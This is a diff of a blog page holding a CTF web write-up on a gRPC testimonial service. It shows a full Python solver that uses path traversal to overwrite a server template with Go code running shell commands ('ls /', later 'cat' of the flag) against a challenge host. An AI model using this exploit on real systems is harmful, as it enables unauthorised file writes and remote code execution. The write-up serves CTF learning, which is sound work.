@@ -107,26 +107,31 @@ pip install grpcio grpcio-tools Inside the folder that has the .proto file, whic
   <link rel="apple-touch-icon" href="https://berliangabriel.github.io/apple-touch-icon.png" />
 
   
-  <meta name="generator" content="Hugo 0.92.2" />
+  <meta name="generator" content="Hugo 0.127.0">
 
   
   
   
   
   
-  <meta itemprop="name" content="Cyber Apocalypse CTF 2024 Writeup: Web">
-<meta itemprop="description" content="Testimonial This vulnerable part of the code in grpc.go will allow us to perform arbitrary file write. From there we can overwrite the index.templ to include exec() command, and the output will be displayed in the testimonial box.
-err := os.WriteFile(fmt.Sprintf(&#34;public/testimonials/%s&#34;, req.Customer), []byte(req.Testimonial), 0644) We need the following python libaray to interact directly with the gRPC server:
-pip install grpcio grpcio-tools Inside the folder that has the .proto file, which in this case is \challenge\pb\pytypes."><meta itemprop="datePublished" content="2024-03-14T20:05:02+08:00" />
-<meta itemprop="dateModified" content="2024-03-14T20:05:02+08:00" />
-<meta itemprop="wordCount" content="1021">
-<meta itemprop="keywords" content="" />
+
+
   
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Cyber Apocalypse CTF 2024 Writeup: Web"/>
-<meta name="twitter:description" content="Testimonial This vulnerable part of the code in grpc.go will allow us to perform arbitrary file write. From there we can overwrite the index.templ to include exec() command, and the output will be displayed in the testimonial box.
+  
+  <meta itemprop="name" content="Cyber Apocalypse CTF 2024 Writeup: Web">
+  <meta itemprop="description" content="Testimonial This vulnerable part of the code in grpc.go will allow us to perform arbitrary file write. From there we can overwrite the index.templ to include exec() command, and the output will be displayed in the testimonial box.
 err := os.WriteFile(fmt.Sprintf(&#34;public/testimonials/%s&#34;, req.Customer), []byte(req.Testimonial), 0644) We need the following python libaray to interact directly with the gRPC server:
-pip install grpcio grpcio-tools Inside the folder that has the .proto file, which in this case is \challenge\pb\pytypes."/>
+pip install grpcio grpcio-tools Inside the folder that has the .proto file, which in this case is \challenge\pb\pytypes.">
+  <meta itemprop="datePublished" content="2024-03-14T20:05:02+08:00">
+  <meta itemprop="dateModified" content="2024-03-14T20:05:02+08:00">
+  <meta itemprop="wordCount" content="1021">
+  
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Cyber Apocalypse CTF 2024 Writeup: Web">
+  <meta name="twitter:description" content="Testimonial This vulnerable part of the code in grpc.go will allow us to perform arbitrary file write. From there we can overwrite the index.templ to include exec() command, and the output will be displayed in the testimonial box.
+err := os.WriteFile(fmt.Sprintf(&#34;public/testimonials/%s&#34;, req.Customer), []byte(req.Testimonial), 0644) We need the following python libaray to interact directly with the gRPC server:
+pip install grpcio grpcio-tools Inside the folder that has the .proto file, which in this case is \challenge\pb\pytypes.">
 
   
   
@@ -141,7 +146,7 @@ pip install grpcio grpcio-tools Inside the folder that has the .proto file, whic
   <div class="relative z-50 mr-auto flex items-center">
     <a
       class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
-      href="https://berliangabriel.github.io"
+      href="https://berliangabriel.github.io/"
       >Berlian Gabriel</a
     >
     <div
@@ -277,139 +282,139 @@ pip install grpcio grpcio-tools Inside the folder that has the .proto file, whic
 
   <section><h1 id="testimonial">Testimonial</h1>
 <p>This vulnerable part of the code in <code>grpc.go</code> will allow us to perform arbitrary file write. From there we can overwrite the index.templ to include exec() command, and the output will be displayed in the testimonial box.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;public/testimonials/%s&#34;</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Customer</span>), []byte(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Testimonial</span>), <span style="color:#ae81ff">0644</span>)
-</code></pre></div><p>We need the following python libaray to interact directly with the gRPC server:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pip install grpcio grpcio-tools
-</code></pre></div><p>Inside the folder that has the .proto file, which in this case is <code>\challenge\pb\pytypes.proto</code> you can generate the Python gRPC code as follows:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python -m grpc_tools.protoc -I. --python_out<span style="color:#f92672">=</span>. --grpc_python_out<span style="color:#f92672">=</span>. ptypes.proto
-</code></pre></div><p>We can list the directory / to know the flag filename, and then later we modify the ls command to cat the flag, using the solver below.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">WriteFile</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;public/testimonials/%s&#34;</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Customer</span>), []byte(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Testimonial</span>), <span style="color:#ae81ff">0644</span>)
+</span></span></code></pre></div><p>We need the following python libaray to interact directly with the gRPC server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install grpcio grpcio-tools
+</span></span></code></pre></div><p>Inside the folder that has the .proto file, which in this case is <code>\challenge\pb\pytypes.proto</code> you can generate the Python gRPC code as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -m grpc_tools.protoc -I. --python_out<span style="color:#f92672">=</span>. --grpc_python_out<span style="color:#f92672">=</span>. ptypes.proto
+</span></span></code></pre></div><p>We can list the directory / to know the flag filename, and then later we modify the ls command to cat the flag, using the solver below.
 <br/>
 <strong>solver.py</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> grpc
-<span style="color:#f92672">import</span> ptypes_pb2
-<span style="color:#f92672">import</span> ptypes_pb2_grpc
-
-newTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
-</span><span style="color:#e6db74">package home
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">import (
-</span><span style="color:#e6db74">	&#34;htbchal/view/layout&#34;
-</span><span style="color:#e6db74">	&#34;io/fs&#34;	
-</span><span style="color:#e6db74">	&#34;fmt&#34;
-</span><span style="color:#e6db74">	&#34;os&#34;
-</span><span style="color:#e6db74">    &#34;os/exec&#34;
-</span><span style="color:#e6db74">)
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">templ Index() {
-</span><span style="color:#e6db74">	@layout.App(true) {
-</span><span style="color:#e6db74">&lt;nav class=&#34;navbar navbar-expand-lg navbar-dark bg-black&#34;&gt;
-</span><span style="color:#e6db74">  &lt;div class=&#34;container-fluid&#34;&gt;
-</span><span style="color:#e6db74">    &lt;a class=&#34;navbar-brand&#34; href=&#34;/&#34;&gt;The Fray&lt;/a&gt;
-</span><span style="color:#e6db74">    &lt;button class=&#34;navbar-toggler&#34; type=&#34;button&#34; data-toggle=&#34;collapse&#34; data-target=&#34;#navbarNav&#34;
-</span><span style="color:#e6db74">            aria-controls=&#34;navbarNav&#34; aria-expanded=&#34;false&#34; aria-label=&#34;Toggle navigation&#34;&gt;
-</span><span style="color:#e6db74">        &lt;span class=&#34;navbar-toggler-icon&#34;&gt;&lt;/span&gt;
-</span><span style="color:#e6db74">    &lt;/button&gt;
-</span><span style="color:#e6db74">    &lt;div class=&#34;collapse navbar-collapse&#34; id=&#34;navbarNav&#34;&gt;
-</span><span style="color:#e6db74">        &lt;ul class=&#34;navbar-nav ml-auto&#34;&gt;
-</span><span style="color:#e6db74">            &lt;li class=&#34;nav-item active&#34;&gt;
-</span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;/&#34;&gt;Home&lt;/a&gt;
-</span><span style="color:#e6db74">            &lt;/li&gt;
-</span><span style="color:#e6db74">            &lt;li class=&#34;nav-item&#34;&gt;
-</span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;javascript:void();&#34;&gt;Factions&lt;/a&gt;
-</span><span style="color:#e6db74">            &lt;/li&gt;
-</span><span style="color:#e6db74">            &lt;li class=&#34;nav-item&#34;&gt;
-</span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;javascript:void();&#34;&gt;Trials&lt;/a&gt;
-</span><span style="color:#e6db74">            &lt;/li&gt;
-</span><span style="color:#e6db74">            &lt;li class=&#34;nav-item&#34;&gt;
-</span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;javascript:void();&#34;&gt;Contact&lt;/a&gt;
-</span><span style="color:#e6db74">            &lt;/li&gt;
-</span><span style="color:#e6db74">        &lt;/ul&gt;
-</span><span style="color:#e6db74">    &lt;/div&gt;
-</span><span style="color:#e6db74">  &lt;/div&gt;
-</span><span style="color:#e6db74">&lt;/nav&gt;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">&lt;div class=&#34;container&#34;&gt;
-</span><span style="color:#e6db74">  &lt;section class=&#34;jumbotron text-center&#34;&gt;
-</span><span style="color:#e6db74">      &lt;div class=&#34;container mt-5&#34;&gt;
-</span><span style="color:#e6db74">          &lt;h1 class=&#34;display-4&#34;&gt;Welcome to The Fray #HACKED&lt;/h1&gt;
-</span><span style="color:#e6db74">          &lt;p class=&#34;lead&#34;&gt;Assemble your faction and prove you&#39;re the last one standing!&lt;/p&gt;
-</span><span style="color:#e6db74">          &lt;a href=&#34;javascript:void();&#34; class=&#34;btn btn-primary btn-lg&#34;&gt;Get Started&lt;/a&gt;
-</span><span style="color:#e6db74">      &lt;/div&gt;
-</span><span style="color:#e6db74">  &lt;/section&gt;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">  &lt;section class=&#34;container mt-5&#34;&gt;
-</span><span style="color:#e6db74">      &lt;h2 class=&#34;text-center mb-4&#34;&gt;What Others Say&lt;/h2&gt;
-</span><span style="color:#e6db74">      &lt;div class=&#34;row&#34;&gt;
-</span><span style="color:#e6db74">          @Testimonials()
-</span><span style="color:#e6db74">      &lt;/div&gt;
-</span><span style="color:#e6db74">  &lt;/section&gt;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">  &lt;div class=&#34;row mt-5 mb-5&#34;&gt;
-</span><span style="color:#e6db74">    &lt;div class=&#34;col-md&#34;&gt;
-</span><span style="color:#e6db74">      &lt;h2 class=&#34;text-center mb-4&#34;&gt;Submit Your Testimonial&lt;/h2&gt;
-</span><span style="color:#e6db74">      &lt;form method=&#34;get&#34; action=&#34;/&#34;&gt;
-</span><span style="color:#e6db74">        &lt;div class=&#34;form-group&#34;&gt;
-</span><span style="color:#e6db74">          &lt;label class=&#34;mt-2&#34; for=&#34;testimonialText&#34;&gt;Your Testimonial&lt;/label&gt;
-</span><span style="color:#e6db74">          &lt;textarea class=&#34;form-control mt-2&#34; id=&#34;testimonialText&#34; rows=&#34;3&#34; name=&#34;testimonial&#34;&gt;&lt;/textarea&gt;
-</span><span style="color:#e6db74">        &lt;/div&gt;
-</span><span style="color:#e6db74">        &lt;div class=&#34;form-group&#34;&gt;
-</span><span style="color:#e6db74">          &lt;label class=&#34;mt-2&#34; for=&#34;testifierName&#34;&gt;Your Name&lt;/label&gt;
-</span><span style="color:#e6db74">          &lt;input type=&#34;text&#34; class=&#34;form-control mt-2&#34; id=&#34;testifierName&#34; name=&#34;customer&#34;/&gt;
-</span><span style="color:#e6db74">        &lt;/div&gt;
-</span><span style="color:#e6db74">        &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary mt-4&#34;&gt;Submit Testimonial&lt;/button&gt;
-</span><span style="color:#e6db74">      &lt;/form&gt;
-</span><span style="color:#e6db74">    &lt;/div&gt;
-</span><span style="color:#e6db74">  &lt;/div&gt;
-</span><span style="color:#e6db74">&lt;/div&gt;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">&lt;footer class=&#34;bg-black text-white text-center py-3&#34;&gt;
-</span><span style="color:#e6db74">    &lt;p&gt;&amp;copy; 2024 The Fray. All Rights Reserved.&lt;/p&gt;
-</span><span style="color:#e6db74">&lt;/footer&gt;
-</span><span style="color:#e6db74">	}
-</span><span style="color:#e6db74">}
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">func GetTestimonials() []string {
-</span><span style="color:#e6db74">	fsys := os.DirFS(&#34;public/testimonials&#34;)	
-</span><span style="color:#e6db74">	files, err := fs.ReadDir(fsys, &#34;.&#34;)		
-</span><span style="color:#e6db74">	if err != nil {
-</span><span style="color:#e6db74">		return []string{fmt.Sprintf(&#34;Error reading testimonials: %v&#34;, err)}
-</span><span style="color:#e6db74">	}
-</span><span style="color:#e6db74">	var res []string
-</span><span style="color:#e6db74">	for _, file := range files {
-</span><span style="color:#e6db74">		fileContent, _ := fs.ReadFile(fsys, file.Name())
-</span><span style="color:#e6db74">		res = append(res, string(fileContent))		
-</span><span style="color:#e6db74">	}
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">	output, _ := exec.Command(&#34;ls&#34;, &#34;/&#34;).Output()
-</span><span style="color:#e6db74">	res = append(res, string(output))
-</span><span style="color:#e6db74">	return res
-</span><span style="color:#e6db74">}
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">templ Testimonials() {
-</span><span style="color:#e6db74">  for _, item := range GetTestimonials() {
-</span><span style="color:#e6db74">    &lt;div class=&#34;col-md-4&#34;&gt;
-</span><span style="color:#e6db74">        &lt;div class=&#34;card mb-4&#34;&gt;
-</span><span style="color:#e6db74">            &lt;div class=&#34;card-body&#34;&gt;
-</span><span style="color:#e6db74">                &lt;p class=&#34;card-text&#34;&gt;&#34;</span><span style="color:#e6db74">{item}</span><span style="color:#e6db74">&#34;&lt;/p&gt;
-</span><span style="color:#e6db74">                &lt;p class=&#34;text-muted&#34;&gt;- Anonymous Testifier&lt;/p&gt;
-</span><span style="color:#e6db74">            &lt;/div&gt;
-</span><span style="color:#e6db74">        &lt;/div&gt;
-</span><span style="color:#e6db74">    &lt;/div&gt;
-</span><span style="color:#e6db74">  }
-</span><span style="color:#e6db74">}
-</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>():
-    <span style="color:#75715e"># Assuming the server is running on the specified IP and port</span>
-    <span style="color:#66d9ef">with</span> grpc<span style="color:#f92672">.</span>insecure_channel(<span style="color:#e6db74">&#39;83.136.249.237:30739&#39;</span>) <span style="color:#66d9ef">as</span> channel:
-        stub <span style="color:#f92672">=</span> ptypes_pb2_grpc<span style="color:#f92672">.</span>RickyServiceStub(channel)
-        response <span style="color:#f92672">=</span> stub<span style="color:#f92672">.</span>SubmitTestimonial(ptypes_pb2<span style="color:#f92672">.</span>TestimonialSubmission(customer<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../view/home/index.templ&#34;</span>, testimonial<span style="color:#f92672">=</span>newTemplate))
-        print(<span style="color:#e6db74">&#34;Client received: &#34;</span> <span style="color:#f92672">+</span> response<span style="color:#f92672">.</span>message)
-
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-    run()
-</code></pre></div><p><img src="https://github.com/BerlianGabriel/BerlianGabriel.github.io/blob/main/resources/Cyber-Apocalypse-CTF-2024/web1.png?raw=true" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> grpc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ptypes_pb2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ptypes_pb2_grpc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>newTemplate <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">package home
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import (
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	&#34;htbchal/view/layout&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	&#34;io/fs&#34;	
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	&#34;fmt&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	&#34;os&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;os/exec&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">templ Index() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	@layout.App(true) {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;nav class=&#34;navbar navbar-expand-lg navbar-dark bg-black&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;div class=&#34;container-fluid&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;a class=&#34;navbar-brand&#34; href=&#34;/&#34;&gt;The Fray&lt;/a&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;button class=&#34;navbar-toggler&#34; type=&#34;button&#34; data-toggle=&#34;collapse&#34; data-target=&#34;#navbarNav&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            aria-controls=&#34;navbarNav&#34; aria-expanded=&#34;false&#34; aria-label=&#34;Toggle navigation&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;span class=&#34;navbar-toggler-icon&#34;&gt;&lt;/span&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/button&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;div class=&#34;collapse navbar-collapse&#34; id=&#34;navbarNav&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;ul class=&#34;navbar-nav ml-auto&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;li class=&#34;nav-item active&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;/&#34;&gt;Home&lt;/a&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/li&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;li class=&#34;nav-item&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;javascript:void();&#34;&gt;Factions&lt;/a&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/li&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;li class=&#34;nav-item&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;javascript:void();&#34;&gt;Trials&lt;/a&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/li&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;li class=&#34;nav-item&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;a class=&#34;nav-link&#34; href=&#34;javascript:void();&#34;&gt;Contact&lt;/a&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/li&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/ul&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/nav&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;div class=&#34;container&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;section class=&#34;jumbotron text-center&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;div class=&#34;container mt-5&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;h1 class=&#34;display-4&#34;&gt;Welcome to The Fray #HACKED&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;p class=&#34;lead&#34;&gt;Assemble your faction and prove you&#39;re the last one standing!&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;a href=&#34;javascript:void();&#34; class=&#34;btn btn-primary btn-lg&#34;&gt;Get Started&lt;/a&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/section&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;section class=&#34;container mt-5&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;h2 class=&#34;text-center mb-4&#34;&gt;What Others Say&lt;/h2&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;div class=&#34;row&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          @Testimonials()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/section&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;div class=&#34;row mt-5 mb-5&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;div class=&#34;col-md&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;h2 class=&#34;text-center mb-4&#34;&gt;Submit Your Testimonial&lt;/h2&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;form method=&#34;get&#34; action=&#34;/&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;div class=&#34;form-group&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;label class=&#34;mt-2&#34; for=&#34;testimonialText&#34;&gt;Your Testimonial&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;textarea class=&#34;form-control mt-2&#34; id=&#34;testimonialText&#34; rows=&#34;3&#34; name=&#34;testimonial&#34;&gt;&lt;/textarea&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;div class=&#34;form-group&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;label class=&#34;mt-2&#34; for=&#34;testifierName&#34;&gt;Your Name&lt;/label&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;input type=&#34;text&#34; class=&#34;form-control mt-2&#34; id=&#34;testifierName&#34; name=&#34;customer&#34;/&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary mt-4&#34;&gt;Submit Testimonial&lt;/button&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/form&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;footer class=&#34;bg-black text-white text-center py-3&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;p&gt;&amp;copy; 2024 The Fray. All Rights Reserved.&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/footer&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">func GetTestimonials() []string {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	fsys := os.DirFS(&#34;public/testimonials&#34;)	
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	files, err := fs.ReadDir(fsys, &#34;.&#34;)		
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	if err != nil {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		return []string{fmt.Sprintf(&#34;Error reading testimonials: %v&#34;, err)}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	var res []string
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	for _, file := range files {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		fileContent, _ := fs.ReadFile(fsys, file.Name())
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">		res = append(res, string(fileContent))		
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	output, _ := exec.Command(&#34;ls&#34;, &#34;/&#34;).Output()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	res = append(res, string(output))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	return res
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">templ Testimonials() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  for _, item := range GetTestimonials() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;div class=&#34;col-md-4&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;div class=&#34;card mb-4&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;div class=&#34;card-body&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;p class=&#34;card-text&#34;&gt;&#34;</span><span style="color:#e6db74">{item}</span><span style="color:#e6db74">&#34;&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;p class=&#34;text-muted&#34;&gt;- Anonymous Testifier&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Assuming the server is running on the specified IP and port</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> grpc<span style="color:#f92672">.</span>insecure_channel(<span style="color:#e6db74">&#39;83.136.249.237:30739&#39;</span>) <span style="color:#66d9ef">as</span> channel:
+</span></span><span style="display:flex;"><span>        stub <span style="color:#f92672">=</span> ptypes_pb2_grpc<span style="color:#f92672">.</span>RickyServiceStub(channel)
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> stub<span style="color:#f92672">.</span>SubmitTestimonial(ptypes_pb2<span style="color:#f92672">.</span>TestimonialSubmission(customer<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../view/home/index.templ&#34;</span>, testimonial<span style="color:#f92672">=</span>newTemplate))
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Client received: &#34;</span> <span style="color:#f92672">+</span> response<span style="color:#f92672">.</span>message)
+</span></span><span style="display:flex;"><span>
